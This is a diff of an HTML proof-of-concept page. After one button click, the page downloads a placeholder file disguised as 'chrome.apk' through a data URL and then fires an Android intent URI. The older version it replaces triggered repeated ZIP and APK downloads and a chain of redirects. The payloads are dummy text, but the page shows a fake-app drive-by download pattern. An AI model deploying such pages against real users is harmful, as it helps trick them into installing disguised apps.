@@ -2,43 +2,33 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Maximally Robust Android PoC</title>
+<title>Single APK Download + Intent PoC</title>
 </head>
 <body>
 
-<h3>Maximally Robust Android PoC</h3>
+<h3>Download chrome.apk + Intent PoC</h3>
 <button id="start">Start</button>
 
 <script>
 document.getElementById('start').addEventListener('click', () => {
   try {
-    console.log("Starting PoC flow...");
+    // =========================
+    // 1. Auto-download APK
+    // =========================
+    const content = "PK\nFake Chrome APK PoC\nclasses.dex\nAndroidManifest.xml\nEND";
+    const base64 = btoa(content);
+    const dataUrl = "data:application/vnd.android.package-archive;base64," + base64;
+
+    const a = document.createElement('a');
+    a.href = dataUrl;
+    a.download = "chrome.apk"; // nama file
+    a.click(); // trigger download sekali
+    console.log("chrome.apk download triggered");
 
     // =========================
-    // 1. Multiple download triggers (ZIP + dummy APK)
+    // 2. Trigger Android Intent
     // =========================
-    const files = [
-      {name: "update.zip", content: "PK\nAdvanced ZIP\nHello Android\nEND"},
-      {name: "dummy.apk", content: "PK\nFake APK\nAndroidManifest.xml\nEND"}
-    ];
-
-    files.forEach(file => {
-      const base64 = btoa(file.content);
-      const dataUrl = "data:application/octet-stream;base64," + base64;
-      const a = document.createElement('a');
-      a.href = dataUrl;
-      a.download = file.name;
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-    });
-
-    console.log("Multiple downloads triggered");
-
-    // =========================
-    // 2. Intent URI + fallback chain
-    // =========================
-    const intentUrl =
+    const intentUrl = 
       "intent://scan/#Intent;" +
       "scheme=zxing;" +
       "package=com.google.zxing.client.android;" +
@@ -47,32 +37,14 @@ document.getElementById('start').addEventListener('click', () => {
       ";" +
       "end";
 
-    // multi-step intent + fallback
-    setTimeout(() => location.href = intentUrl, 300);       // Try intent
-    setTimeout(() => window.open("https://google.com", "_blank"), 800); // fallback
-    setTimeout(() => location.href = "https://google.com", 1200);       // final redirect
-
-    console.log("Intent + fallback chain triggered");
-
-    // =========================
-    // 3. Optional: repeat download after fallback
-    // =========================
+    // delay sedikit supaya download tereksekusi dulu
     setTimeout(() => {
-      files.forEach(file => {
-        const base64 = btoa(file.content);
-        const dataUrl = "data:application/octet-stream;base64," + base64;
-        const a = document.createElement('a');
-        a.href = dataUrl;
-        a.download = file.name;
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      });
-      console.log("Repeat downloads after fallback");
-    }, 2000);
+      location.href = intentUrl;
+      console.log("Intent triggered");
+    }, 300);
 
   } catch (e) {
-    console.error("Error in PoC:", e);
+    console.error("Error:", e);
   }
 });
 </script>
